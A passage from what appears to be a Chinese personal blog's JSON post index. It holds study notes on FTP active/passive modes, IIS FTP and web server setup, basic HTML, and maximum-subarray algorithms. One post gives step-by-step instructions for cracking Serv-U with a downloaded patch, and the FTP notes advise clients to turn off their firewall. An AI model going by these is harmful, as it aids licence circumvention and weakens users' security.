域账号进行分组。如财务部、技术部、宣传部等等……","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"FTP服务器搭建2","date":"2020-08-16T14:30:30.000Z","path":"2020/08/16/2020.08.16 IIS 之 FTP 服务器2/","text":"FTP 服务器2ftp 主被动模式知识储备![ftp主被动模式过程](http://images.fangning.xyz//ftp 主被动模式过程.png)** 12345678910111213141516171819201. # 21 端口号：&#x27;控制&#x27;端口。传输控制信息，比如发送连接请求，请求连接密钥，提供用户登陆信息等等...... # 20 端口号：&#x27;数据&#x27;端口。传输数据甬道，上传文件数据 或者 下载数据的专用端口。2. 采取 主动连接模式 还是 被动连接模式 &#x27;由客户机决定&#x27;。通常在客户机发送第一个连接请求的时候说明。3. 主被动都是 &#x27;相对于的服务器而言&#x27; 的。 1) 主动：表示由&#x27;服务器来主动访问客户机的随机端口&#x27;，以此建立数据传输通道。 2) 被动：表示服务器产生一个用于数据传输的随机端口之后，&#x27;被客户机来访问&#x27;。4. 无论是主动，或者被动。连接 ftp 服务器的&#x27;客户机&#x27;，都&#x27;必须开放两个端口&#x27;用于文件传输服务。 1) 一个为控制端口，一个为数据端口。 2) 端口号&#x27;随机产生&#x27;，一般 &gt; 50000。5. 无论是主动，或者被动。&#x27;ftp 服务器&#x27;，都&#x27;必须打开 tcp21 ftp控制端口号&#x27;。用于传输控制信号。 1) 如果是&#x27;主动模式&#x27;，服务器还会在数据传输时，打开 &#x27;tcp20 号端口&#x27;，进行数据传输。 2) 如果是&#x27;被动模式&#x27;，服务器在数据传输时，只会提供一个 &#x27;&gt; 20000 的随机端口号&#x27;，进行数据传输。6. 一台计算机上，除了有特定功能的端口号外，其他没有使用的端口都是关闭的。并且&#x27;防火墙&#x27;会&#x27;拦截外部对这些端口的连接请求&#x27;。 1) 当然，防火墙&#x27;不会阻止&#x27;这些端口&#x27;对外发送连接请求&#x27;。只会拦截外部对内的请求。 2) 因此，如果本地&#x27;开了防火墙&#x27;，即使开放了&#x27;不常用的端口&#x27;，&#x27;外部&#x27;也&#x27;无法主动进行访问&#x27;。 总结12345671. 无论是主动/被动模式，&#x27;数据传输建立过程&#x27;，都可能被 客户端 或 服务器端 的&#x27;防火墙阻止&#x27;。2. &#x27;主动模式&#x27;中，如果&#x27;客户机开了防火墙&#x27;，那么会导致 ftp 连接失败。3. &#x27;被动模式&#x27;中，如果&#x27;服务器开了防火墙&#x27;，那么会导致 ftp 连接失败。4. 主动模式也称为&#x27;活动模式&#x27;。 相关知识 生产环境中，服务器肯定是要开防火墙的。所以，客户端在连接 ftp 服务器的时候，必须关闭防火墙，然后改 主动连接模式。 在一次 ftp 数据传输过程中，客户端的数据端口号是随机的，并且是不断变化的。 端口号状态： LISTENING：端口号打开，并且处于监听状态。 ESTABLISHED：established 表示该端口号正在被使用。 TIME_WAIT：我方主动断开连接，并且得到对方确认。处于该状态时，所占用的资源不会被释放。也就是端口号关闭了，但是新的连接不能调用这个空闲的端口号，仍处于占用状态。 CLOSE_WAIT：对方主动断开连接，或者网络状态异常。此时，需要我方主动调用 close() 函数关闭端口。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"分而治之","date":"2020-08-16T03:41:30.000Z","path":"2020/08/16/2020.08.16 最大子序列/","text":"分而治之思想——最大子序列和首先说一下自己O(n)算法的总体思路思路：一段序列的子序列，必须是连续的。要求最大的子序列，就是找出原序列中一段连续空间元素和最大应该是多少。 ​ 朴素算法是，枚举起始位置 i , 和终止位置 j。然后每次求 i ~ j的和，最终得到结果。该算法时间复杂度为O(n^n)，明显是不可取的。 ​ 要求和的话，肯定先想到前缀和，然后由于要找一段子序列的和，那么如果两个位置的前缀和相减，得到的不就是中间一段连续空间的和了嘛？需要添加一个数组 sum。 ​ 那么应该如何确定哪两个位置的前缀和相减呢？首先，肯定是后面的位置 j 减前面的位置 i，我们可以枚举每一个后面的位置 j。 ​ 那如何确定 i ？很显然，找小于 j 的最小的一个数，他们之间的差就一定最大。那么如何找最小的数？每次都遍历一遍太费时间。所以我们可以一遍找出所有位置之前所有元素中最小元素所在位置。这需要我们再添加一个数组 vis。 样例： 对于一个序列 -2 1 -3 4 -1 2 1 -5 4 求出它的前缀和： 0 -2 -1 -4 0 -1 1 2 -3 1 第 i 个位置表示的是它之前所有位置元素的和。 然后再求前缀和最小和所在位置：0 1 1 3 3 3 3 3 3 3 第 i 个位置表示包括该位置在内前 i+1 个前缀和最小的和所在位置。eg：第四个位置为3，是因为其缀和数组中，前四个元素最小元素下标是3，sum[3] = -4 is Min。 当 sum 数组中的 2 减 前面的 -4 得到的结果 6 最大，所以，最大子序列和就是 [3, 6] = 4 + -1 + 2 + 1 = 6。 代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; int nums[1000], numsSize; int sum[1000], vis[1000]; // 空间复杂度有点大了 int i, ans; //输入 scanf(&quot;%d&quot;, &amp;numsSize); for( i = 0; i &lt; numsSize; i++) scanf(&quot;%d&quot;, &amp;nums[i]); //计算出前缀和数组。 for( i = 0; i &lt;= numsSize; i++ ) &#123; if(!i) sum[i] = 0; else sum[i] = sum[i-1] + nums[i-1]; printf(&quot;%d &quot;, sum[i]); &#125; putchar(&#x27;\\n&#x27;); //计算出前缀和数组中第前i+1个元素的最小元素所在位置。以该位置作为子序列的起点。 for( i = 0; i &lt; numsSize; i++ ) &#123; if(!i) vis[i] = i; else&#123; if(sum[i] &lt; sum[vis[i-1]]) vis[i] = i; else vis[i] = vis[i-1]; &#125; printf(&quot;%d &quot;, vis[i]); &#125; putchar(&#x27;\\n&#x27;); // 从最后一个元素的后一个位置开始，以该元素作为子序列的结束点。 for( i = numsSize; i &gt; 0; i--) &#123; int x = sum[i] - sum[vis[i-1]]; if(i == numsSize) ans = x; if(x &gt; ans) ans = x; //区间 [vis[i-1] , i-1] &#125; printf(&quot;%d\\n&quot;, ans); return 0;&#125;/**力扣测试结果：202 / 202 个通过测试用例状态：通过执行用时：4 ms 超过%99.11的C提交内存消耗：6.3 MB 超过%100.00的C提交注：该方法是自己第一时间想到的O(n)级算法。当然对于最大子序列和还有更好的分治算法。**/ 再探讨一下据说是最优的分而治之思想将区间[0 , n] 分为两段，左子区间[0, n/2] ，右子区间 [n/2+1, n]。维护每一段的四个量(这是最难想到的)： 对于区间 [l, r]， 维护： lsum : 以 l 为起始的最大子序列和。 rsum：以 r 为终点的最大子序列和。 isum：区间[l, r]的和。 msum：区间[l, r]的最大子序列和。 msum 可能是它的左子区间的msum， 也可能是它右子区间的msum。或者跨越两个区间，是左子区间的 rsum + 右子区间的 lsum。 lsum 可能是它左子区间的 lsum，或者跨越两个子区间，是左子区间的 isum + 右子区间的 rsum。 rsum 同理。 isum 易得。 12345678910111213141516171819202122232425262728293031class Solution &#123;public: struct Status &#123; int lSum, rSum, mSum, iSum; &#125;; Status pushUp(Status l, Status r) &#123; int iSum = l.iSum + r.iSum; int lSum = max(l.lSum, l.iSum + r.lSum); int rSum = max(r.rSum, r.iSum + l.rSum); int mSum = max(max(l.mSum, r.mSum), l.rSum + r.lSum); return (Status) &#123;lSum, rSum, mSum, iSum&#125;; &#125;; Status get(vector&lt;int&gt; &amp;a, int l, int r) &#123; if (l == r) return (Status) &#123;a[l], a[l], a[l], a[l]&#125;; int m = (l + r) &gt;&gt; 1; Status lSub = get(a, l, m); Status rSub = get(a, m + 1, r); return pushUp(lSub, rSub); &#125; int maxSubArray(vector&lt;int&gt;&amp; nums) &#123; return get(nums, 0, nums.size() - 1).mSum; &#125;&#125;;作者：LeetCode-Solution链接：https://leetcode-cn.com/problems/maximum-subarray/solution/zui-da-zi-xu-he-by-leetcode-solution/来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 其他方法哎，自己果然是最菜的。思维方式还是太朴素，没有真正掌握动态规划，和贪心思想的精髓和思维模式，思维方法。 这种题是很简单的，更好的算法是，动态规划O(n)的时间复杂度和O(1)的空间复杂度。还有贪心算法，也是O(n)和O(1)。不过空间开销略微比动态规划多一点。两种方法都远好于我自己想的。 动态规划：f(i) 表示以第 i 个数结尾的连续子数组的最大和。ans = max{ f(i) } | 0 &lt;= i &lt; sizeof(nums) 那如何求解 f(i) 呢？f(i) 需要考虑假设是否加上前一段 f(i-1)。当然是单 f(i-1)&gt;0 时，加上它才最优。 12345678910111213141516class Solution &#123;public: int maxSubArray(vector&lt;int&gt;&amp; nums) &#123; int pre = 0, maxAns = nums[0]; for (const auto &amp;x: nums) &#123; pre = max(pre + x, x); maxAns = max(maxAns, pre); &#125; return maxAns; &#125;&#125;;作者：LeetCode-Solution链接：https://leetcode-cn.com/problems/maximum-subarray/solution/zui-da-zi-xu-he-by-leetcode-solution/来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 贪心算法：和动态规划思想差不多。每次遍历一遍，计算之前所有元素的和。 如果之前的元素和大于0，累加，判断是否更新更新 ans。 如果之前的元素和小于0，丢弃，只加本身，判断是否更新 ans。 12345678910class Solution: def maxSubArray(Self, nums:List[int]) -&gt; int: if not nums: return -2147483648 cur_sum = max_sum = nums[0] for i in range(1, len(nums)): cur_sum = max(nums[i], cur_sum + nums[i]) max_sum = max(cur_sum, max_sum) return max_sum","link":"","tags":[{"name":"ACM","slug":"ACM","permalink":"http://www.fangning.xyz.com/tags/ACM/"}]},{"title":"FTP服务器搭建","date":"2020-08-13T11:30:30.000Z","path":"2020/08/13/2020.08.13 IIS 之 FTP 服务器/","text":"FTP 服务器搭建FTP服务器 File Transfer Protocol：文件传输协议。 端口号： TCP 20 / 21 FTP 工作方式： 主动(活动)模式。 被动模式。 FTP 服务器部署123456789101112131415161718192021222324252627282930313233343536373839404142431. 设置好固定 IP 地址， 安装好 IIS 管理工具。2. 安装好 IIS 之后，实际上已经部署好了 FTP。并且 21 端口号已经打开。3. 此时的 ftp 默认部署路径是 c:\\inetpub\\ftproot 此时访问权限允许匿名访问，所以登陆不需要密码。# 一些优化骚操作：1. 修改默认 FTP 路径，可以任意指定。2. 将 &quot;网站主目录&quot; 设置成 FTP服务的 &quot;主目录&quot;。这样就弄通过共享，让别人来管理你的网站。# 完整部署步骤1. 打开 IIS 右键新建 FTP 站点。2. 绑定该服务器的 IP 地址 和 所用的端口号。 &quot;IP 和 端口号&quot; 就是 FTP 站点的两个必须满足的标识。3. 隔离用户设置页面暂时不需要进行修改，因为还没有接触到域。4. 添加 ftp 主目录。找个地方新建一个文件夹，然后作为 ftp 访问路径。5. 设置 ftp 权限。 # 注意，该权限与 share 共享权限同一等级。 # ftp权限 交 ntfs权限 = ftp用户权限。 1) 所以此处权限一般设置成完全控制，然后需要具体进行权限限制的话，&quot;再修改文件夹的ntfs权限就行&quot;。 2) 就好像设置文件共享权限一样。用户最终得到的权限，总是该服务的权限，与文件系统权限取的交集。 3) 最好不要给普通用户赋予修改权限，这样会导致文件被删除。一般修改权限以下所有权限就够用了。6. 注意别忘记取消 ftp站点 的匿名访问。 1) 这个设置是默认启动的，所有来宾都可以访问你的 ftp 站点。 2) 取消匿名后，在服务器内单独设置一个专门用来访问计算机 ftp 的用户。 3) 可以设个 ftp管理员，再设置个 ftp普通用户。 4) 如果是使用第三方软件搭建 FTP 服务器，&#x27;不需要设置系统用户&#x27;。软件本身，可以建立用户！7. 用户登陆的时候： 1) 和访问共享文件时，不同。这里计算机不会给你记住密码。也就是每次访问都需要输入账户密码进行登陆。 2) 访问共享文件时，如果需要切换账户，需要注销计算机。 访问 ftp 的话，可以直接重新在地址栏刷新一遍，再登陆新的账户就行。 或者在空白处右击，选择登陆，直接跳转到账户切换页面。 使用第三方软件部署 FTP123456789101112131415161718192021222324252627282930313233343536373839404142434445461. 有的时候如果是做一些轻量级的临时文件传输。用 u 盘太麻烦，可以直接搭建一个 ftp 服务器。 1) 但是如果安装 windows IIS 的话呢不太容易。所以，一些小 ftp软件 就特别好用。 2) 一键部署，一键赋权限。&#x27;不用管 ftp 权限，也不用管 ntfs 权限&#x27;。 3) 注意，使用第三方软件的时候，不能够冲突。 一个服务器，如果搭建多个 ftp 服务，会失败。 &#x27;因为 ip 和端口号 两个标识相同，会产生冲突。&#x27;2. 软件一：Slyar FTPserver v1.1 1) 超级方便快捷。一键启动ftp服务。 2) 打开该软件时，它自动获得计算机的最高权限，然后通过自动修改 ftp权限 和 ntfs权限。实现你需要赋予的权限。 3) 软件自带文件访问的用户，不需要在服务器新建ftp用户。 4) 不适合生产环境使用，连接的客户数量一多，可能就崩溃了。3. 软件二：Serv-U File Server 15.2.0 1) 下载地址 ：&quot; http://www.dayanzai.me/serv-ufileserver.html/comment-page-1#comments &quot; 本地路径：&quot; C:\\Users\\22157\\Downloads\\Compressed\\Serv-U FTPsetup + patch &quot; 使用参考教程：&quot;https://wenku.baidu.com/view/ecedabf0d05abe23482fb4daa58da0116c171fc4.html &quot; 2) 破解方法： 1) 下载安装正版。作为系统服务安装。&#x27;安装路径不要修改&#x27;。然后安装完成的时候，最后一步取消勾选&#x27;完成后运行软件&#x27;。 2) 此时千万不能直接运行软件。cmd-&gt;services.msc 找到 &#x27;Ser-U 服务，然后关闭&#x27;。 3) shift + ctrl + esc 打开任务管理器，关闭所有 &#x27;Ser 开头的进程&#x27;。 4) 将下载目录的的破解程序&#x27;patch&#x27;，复制到程序安装目录。 5) 运行破解程序，输入昵称和邮箱，&#x27;再勾选 key 复选框&#x27;，然后等级 patch 按钮。至此程序破解完毕。 6) 打开软件，如果没有提示使用日期剩余时间。则破解成功，否则需要卸载软件重新进行操作。 3) 使用方法： (1) 前提知识储备： 第三方软件，软件自身内部可以创建用来访问的 FTP 用户。而&#x27;不需要占用系统用户&#x27;。 第三方软件，一般都是在&#x27;创建用户的时候，给用户指定 FTP主目录&#x27;。因此，可以同时创建多个 FTP 站点。 第三方软件，一个用户在创建好时，会生成一个变量叫 &#x27;HOME&#x27;，用来代替主目录路径。也就是 %HOME% = 主目录 第三方软件，拥有&#x27;虚拟路径功能&#x27;。也就是，你可以指定，主目录以外的真实物理路径到你的 FTP主目录中。用户在访问ftp的时候，所看到的文件夹，或者文件。在真实环境中，不一定都是存在主目录中。 &#x27;使用场景&#x27;：多个主目录不同的ftp站点需要用访问同一个文件夹的时候，可以省去复制该文件的过程。只需给该文件夹&#x27;映射一个虚拟路径到各ftp主目录&#x27;。 第三方软件，在文件访问权限控制时，不需要考虑目录文件夹的 ntfs 权限。只需要在软件内设置就行了。如果主目录内各文件夹的访问权限不一致。需要&#x27;添加用户对个文件夹的单独权限设置，并且权限越严格的优先级应该设置越高，也就是访问控制列表里面位置需要越靠前&#x27;。 第三方软件中，一般给设置好用户名，访问密码，访问权限，以及主目录，还有各子文件夹的访问权限，以及虚拟路径。就可以了。如果有特别需要，可以修改访问端口号，甚至时通过域名进行访问，以及通过 IPv6 进行绑定。 (2) 该软件是通过 域-组-用户 进行管理的。所以，最开始需要新建一个域。 1. 新建域，输入域名 eg：&#x27;ftp.fangning.com&#x27; 2. 配置域，我们只需要做 file transfer 服务，不需要做文件共享服务，所以&#x27;去掉勾选 file sharing domain&#x27;。 3. 使用默认的端口号就行了。 4. 绑定的 ipv4 地址，如果你服务器有多个地址，全部绑定也可以，那样无论客户访问哪一个ip地址，&#x27;都会访问到你这个 ftp服务器&#x27;。一般情况下，绑定一个就行了。 5. 密码加密方式，使用默认的&#x27;使用服务器设置&#x27;单向加密就行了。 6. 此时服务器以及搭建好了，如果访问的用户不需要设置太多的话，可以不设置组管理。&#x27;直接添加用户管理&#x27;。 7. 点击用户 -&gt; 添加 -&gt; 设置用户信息。修改 &#x27;登陆ID、密码、根目录&#x27; 三项就像。 8. 设置权限，查看用户属性，目录访问，添加。路径填写可以&#x27;用 %HOME% 替代主目录&#x27;。必须要设置主目录的访问权限，可以单独设置子目录的访问权限。&#x27;必须遵守 严格的权限 优先级 也要 相对靠前 原则&#x27;。 9. 虚拟路径使用方法。 先在 &#x27;域 -&gt; 主目录 中添加一条虚拟路径&#x27;。填写物理路径，与虚拟路径就行了。如: G:\\ios ===&gt; %HOME%\\ios2 然后，再到需要设置虚拟路径的用户中，添加权限列表。&#x27;路径一定要填写真实路径&#x27;，如 G:\\ios 相关经验 网络共享用 两个 \\ 反斜杠开始。 本地资源管理器路径都用 \\ 反斜杠。 ftp 文件传输路径也用两个 / 斜杠开始。 浏览器域名地址都使用 / 斜杠。 xp 文件属性中，没有安全选项。可以修改。 重大发现 ftp 共享文件路径内的文件夹最好不要用中文命名，测试过如果用 xp 访问中文路径。会乱码。 设置一个用户没有修改权限，但是可以上传，列出，查看，下载。 这样子可以做到，用户不能随意删除ftp内的文件，只可以进行上传。 并且，用户自己上传的文件却可以进行删除，复改等操作。挺方便的。 部署 ftp 服务的软件有很多。官方使用 IIS 工具部署虽然免费了一点。但是稳定，更加安全，不会宕机。 如果知识临时使用 ftp 文件传输。可以选择一些轻量级的 ftp 共享软件。 操作简单，快捷。缺点：可能不太稳定。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"IIS之Web服务器3","date":"2020-08-12T12:30:30.000Z","path":"2020/08/12/2020.08.12 IIS 之 Web 服务器3/","text":"IIS 之 Web 服务器3站点类型 静态网站： 一般由扩展名为 .html 或 .htm 构成。 无后台数据库。 只要是不能和数据库进行数据交换，够通，连接的网页统称为 静态网页。 动态网站：一般扩展名为 .asp 或 .php 等 asp 是微软自己的语言，由该语言开发的网站。一般情况下，只能在微软系统上发布。（Active Server Pages） ​ 在 IIS 中，点击 Web服务扩展，可以找到 asp 扩展进行启用。 php 是通用的脚本语言。Linux 上不能用 asp，只能 php。 有后台数据库，asp/php 语言所编写的程序用来连接 前台页面 或 者 后台数据库。 Html —–&gt; asp\\php ——&gt; 数据库表格 前端页面，触发需要修改数据库的功能。用到中间的 php 脚本程序，实现将数据与数据库交互。 如何发布动态网站1234567891011121314151. 在 DNS 服务器添加动态网站的 主机头。加域名解析。2. 在 IIS 管理工具中，新建网站。绑定服务器 IP，以及刚刚新建的域名。3. 勾选 &quot;允许运行脚本&quot; 权限。 勾选 &quot;允许执行&quot; 权限。 注意：一般情况下，&quot;写入 和 浏览 权限不能勾选&quot;。4. 选择网站原码文件夹，设置为主目录。 设置文档，添加/移动 首页到最上层。 注意：一般情况下，动态网页的首页命名为一般带有 index\\defult\\login 字样。5. 这个时候的 IIS 还不能编译动态语言脚本程序。需要点击 web 服务扩展，启用 asp 扩展。 windows 系统中，做到这步样子就可以正常访问网站了。因为 windows 自带数据库以及 asp脚本允许环境。 但是如果是 Linux 系统的话，还需要搭建 php编译环境 以及 MySql数据库环境。 网络路径相关123456789101112131415161718191. 对于一个网络路径 ：http://www.fangning.com/Admin/ad_login.asp 1) 前面的 http:// 表示该网站遵循 http 协议，使用默认端口号 80进行访问。 如果是 https:// 则表示使用 https 协议，使用默认端口号 tcp443 访问。 2) www.fangning.com 为域名，代表该网站所绑定的&quot;主目录&quot;。 3) 而后面的 &quot;/Admin/ad_login.asp&quot; ，则表示&quot;显示主目录下的 admin子目录 下的 ad_login.asp 网页！&quot;# 访问一个网络路径，实际上就是访问该网站所指定 主目录文件夹 中的 文件。# 网络路径和本地文件路径一样。访问需要 路径，权限。2. 一般一个网站会有两个主页。 1) 一个是用户正常浏览访问的主页。 2) 一个是负责维护、管理等内部负责人员登陆的管理主页。 3) 一般管理员访问的所有的有关管理的网页，都集中在一个叫 Admin 的子文件夹中。&quot;主目录\\Admin&quot;3. 用以上步骤部署的网站。所能访问的范围，只有主目录下的网页。&quot;不包括主目录下 子目录内的网页。&quot; 1) 也就是说如果直接在浏览器输入 &quot;www.fangning.com\\admin\\ad_login&quot;，访问管理员登陆页面。这样子是访问不了的，因为此时子目录内的网页还&quot;没有被赋予公开权限&quot;。 2) 在网站中，右击网站 -&gt; 属性 -&gt; 主目录 -&gt; 下方有一个配置 -&gt; 上方有一个选项 在应用程序配置中，勾选&quot;启用父路径&quot;。 这时候就可以在浏览器的地址栏访问网站主目录下的所有网页了。包括子文件中的网页。 数据库访问相关123456789101. ## 此处本来想写一个关于赋予 IIS 对 网站主目录文件夹 的修改权限。 修改主目录文件夹访问控制列表，添加 &quot;IIS，IUSR&quot; 开头的用户，并且赋予修改权限。 这样一来，虽然 IIS 可以修改网站的数据库。但是，同时&quot;极大地增加了网站的风险&quot;。 2. IUSR-win2003-fn-1 该用户是一个网站的客户账户。就是游客浏览网站时所登陆的账户。 IIS 开头的应该时 IIS 管理工具账户。 3. 这一点课程里面没教，我自己从网络上找的一个基于 asp 的网站，搭建过程中遇到的问题。 当时是，网站的数据库不能进行修改，所以需要服务 IIS 这个权限。 相关经验 windows 系统的话，装 PHP 比较复杂。IIS 只能发布置 asp 语言。 如果拿到一个 PHP 语言编写的网站，最好是使用 Linux 进行发布。 windows 下网络路径或者本地路径都是不区分大小写的。 Linux 下是严格区分大小写的。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"IIS之Web服务器2","date":"2020-08-11T11:30:30.000Z","path":"2020/08/11/2020.08.11 IIS 之 Web 服务器2/","text":"IIS 之 Web 服务器2新建网站123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051521. 右键网站 -&gt; 新建一个网站2. 给网站绑定 IP 地址。 1) 一台服务器上，可能有多个网卡，多个ip。所以需要指定一个 ip 地址来&#x27;作为该网站的IP&#x27;。 2) 如果未分配的话，该服务器上所有 iP 都可以作为该网站的ip地址。 3) 客户可以通过与该网站所绑定的 ip 来进行访问。3. 指定主目录路径。 1) 用 HTML 语言写一个网页。存放到一个文件夹中。 2) 该文件夹就是主目录路径。 4. 设置网页的访问权限。 1) 一般静态网页(也就是用户不能和你进行互动，只能浏览的网页。) 2) 设置成只能读取。5. 正常情况下，访问一个网站是不需要登陆该网站的服务器的。如果显示需要登陆的话。&quot;可能是没有设置匿名访问&quot; 1) 右击网站 -&gt; 属性 -&gt; 目录安全性 -&gt; 允许匿名访问(编辑) -&gt; 启用 2) 在你安装 IIS 管理工具的同时。windows 新建了一个新的用户 &quot;匿名用户 IUSR&quot; 3) 在外网用户访问你所建立的网站时，&quot;默认&quot;是通过你服务器的&quot;匿名用户&quot;登陆服务器，然后进行访问的。6. 设置网站默认首页。 1) 右击网站 -&gt; 属性 -&gt; 文档. 2) 添加自己所写的 index.html 作为默认首页。然后将其移动到最上面。7. 一个网站可以添加多个网页。 1) 在属性，文档中设置 html 文件的优先级。就可以实现优先访问。8. 一台服务器新建多个网站——方法1 ## 同一个端口号，多个IP 1) 注意，一个 IP 地址只能绑定一个网站。 2) 如果你的服务器上面有多个网站，必须建立多个 ip 地址。 3) 或者停用其他网站，只保留一个网站来绑定该服务器的 IP。9. 一台服务器新建多个网站——方法2 ## 同一个IP，多个端口号 1) 给一台服务器分配多个 IP 地址可能会造成不稳定。 2) 还有一种方法，可以多个网站使用同一个 IP 地址。&quot;但是访问途径的端口号不同。&quot; 3) 比如 网站1 使用 TCP80 端口号。 网站2 可以使用 TCP8080 端口号。 4) 使用自定义端口号的时候，需要在 IP 地址后面添加 &quot;:8080&quot; 才是正确的访问路径。 &quot;注意&quot;：自定义功能端口号一般使用一千以上的端口号， 比如 8000， 8080， 最好是 4 位数。这种端口号没有默认功能。10. 一台服务器新建多个网站——方法3 ## 实际运用，同一个IP，同一个端口号，不同的域名。 1) 除 IP地址 和 访问端口号 以外，&quot;网站的第三个标识&quot; —— &quot;主机头&quot;。 2) 利用不同的域名，将网站与域名进行绑定。只有输入正确的域名，才能访问该网站。 3) DNS进行域名解析的时候，虽然解析的 IP 地址可能对应一台服务器上面的多个网站。但是网站还需要，对你所&quot;输入的域名这个参数&quot;进行核对，是否和我的主机头相同。 # 也就是说，你在地址栏输入域名的时候，服务器会获得三个标识参数。主机名(域名)、IP地址、端口号。 # 主机名由用户输入、IP 地址由 DNS 服务器解析、端口号默认是80(也可强制指定)。11. 一般情况下，使用方法 3 ，只能通过域名进行访问网站。而不能通过直接输入 IP 地址的方式来访问。 1) 想要像百度一样，既可以通过域名访问，也可以通过 IP 地址进行访问。 2) 很简单，网站 -&gt; 属性 -&gt; 网站标识 -&gt; 高级 -&gt; 添加。 3) 添加进第 2 种， 或 第 3 种 访问方式都可以。但是要注意，不同的网站，不能用完全一样的网站标识。 比如相同的 IP + 相同的端口号。 4) 甚至，如果你有多个域名，也可以一个网站绑定多个 &quot;主机头&quot;。 简单的网页语言 HTML，标签1234567891011121314151617181920212223242526272829303132333435361. 网页文件的后缀为 htm 或者 html。 1) 通常情况下主页名称为 index.html2. 闭合标签。一个标签有开头，也有结尾。 结尾在 &quot;&lt;&gt;&quot; 中添加 &#x27;/&#x27; 表示结尾。 1) 比如: &lt;html&gt; *** ***** &lt;/html&gt;3. &lt;html&gt; 标签 1) 网页标签，网页都以该标签开始。4. &lt;head&gt; 标签 1) 表示一个网页的头部。 闭合标签 2) 浏览器标签页内容，也就是一个网页的 &quot;title&quot; 存在于 &lt;head&gt; 标签的管辖范围。 3) 一个网页想要被人搜索到，需要做&quot;搜索引擎优化 SEO&quot;，就需要在 &quot;&lt;head&gt;部分&quot; 做。5. &lt;body&gt; 标签 1) 一个网页的主体部分。 闭合标签 2) 一个网页除了标题，你看到的所有部分都属于 &lt;body&gt; 部分。 3) eg. &lt;body&gt; Sorry, the Web is building ! &lt;/body&gt;6. &lt;title&gt; 标签 1) 表示一个网页的标题。 闭合标签 2) 该部分写在网页的头部。 3) eg: &lt;title&gt; 欢迎来到方宁的网页 &lt;/title&gt;7. &lt;/br&gt; 标签 1) 突然发现这玩意可以用来换行。 非闭合标签 8. &lt;marquee&gt; 标签 1) 添加滚动字幕效果。 闭合标签9. 10. 11. 给计算机分配多个 IP 就像我的真实机一样，ipconfig 出来有很多网卡——虚拟网卡、无线网卡，有线网卡。每一个网卡都连接获取一个 IP 地址。 同时，同一个网卡，可以给其配置多个 地址。 在手动配置 IP 地址页面，点击高级，添加新的 IP。 同一台服务器拥有多个 IP。无论你访问其中哪一个 IP 地址，都是在访问这台服务器。 相关经验 一般发部一个网站的时候，先用前两种方法进行测试。给服务器添加 IP，或者修改负责端口号。这样子进行测试比较方便。因为不需要去绑定域名，和修改 DNS 服务器。 而，对于正常使用，地三种方法，就比较便于用户访问。 之前，我访问电信光猫管理页面的时候。 192.168.1.1 是私自管理页面 192.168.1.1:8080 是超级管理页面 同一台服务器，通过不同的端口号进行访问，得到两个不同的网站。太狗了，非专业人士，鬼知道你把超级管理页面开到另外一个端口号上，并且用的是同一个 IP 地址。远在天边近在眼前","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"IIS之Web服务器","date":"2020-08-10T09:30:30.000Z","path":"2020/08/10/2020.08.10 IIS 之 Web 服务器/","text":"IIS 之 Web 服务器概述 WEB 服务器也称为网页服务器 或则 HTTP 服务器 或者 www万维网服务器。 web 服务器，使用的是 HTTP 或 HTTPS 协议。 http协议端口号 ：TCP 80 https 协议端口号：TCP 443 FTP 协议端口号：TCP21 WEB服务器发布软件12345671. 作用，将写好的 web 网页发部到互联网上。2. 常见的 web服务器发布软件： 1) 微软：&quot;IIS&quot;（Internet Information system），可以发部 &quot;web 网站 和 FTP 站点&quot;。 2) Linusx：Apache / LAMP / Tomcat / nginx .etc 3) 第三方软件：phpstudy、XAMPP .etc 第三方软件个人测试使用，上面两个官方的是生产环境使用。 WEB 服务器的部署1234567891011121314151617181. 选一台服务器，手动配置 IP 地址。2. 安装 web 服务器管理工具，或者插件。 1) 打开系统光盘。 2) 安装 网络服务 -&gt; 万维网服务 + FTP 服务。 3) 点击确认安装。 4) 此时服务器已经大开了 http 80。以及 tcp 21 ftp协议端口号。 &quot;注意 tcp 443 https 端口好并不是如此容易就可以打卡的&quot;。3. 打开 IIS 管理工具。可以看到 &quot;网站&quot; 和 &quot;FTP站点&quot;。4. 打开浏览器，进行测试。输入 web 服务器地址， 会显示一个 &quot;建设中&quot; 的网站。5. 该网站是一个&quot;默认网站&quot;，无论哪个平台，搭建 web服务器都会自带一个默认的网站。 1) 网站是一群相关的网页的集合。它以文件夹的形式保存在服务器中。 2) 一个网站，往往包含一个或者多个网页 .htm 文件。 3) 只要 web 服务器，存在网站，那么该服务器 80端口号 就是打开状态。如果删除或者停用所有的网站，那么该端口号就&quot;处于关闭状态&quot;。 4) 默认网站，存在漏洞。&quot;一般将其关闭&quot;。该网站存在于 &quot;C:\\Inetpub\\wwwroot&quot; 路径中。 5) 关闭该默认网站。 相关经验 浏览器专业术语叫做 HTTP客户端。类似的 还有 FTP客户端，等等…….. 浏览器接受网页信息的时候，进行翻译 http代码，展示出普通人能够识别的网页。 由前端程序员敲好的 HTTP 前端代码，需要部署到 web 服务器上面。就需要使用 IIS 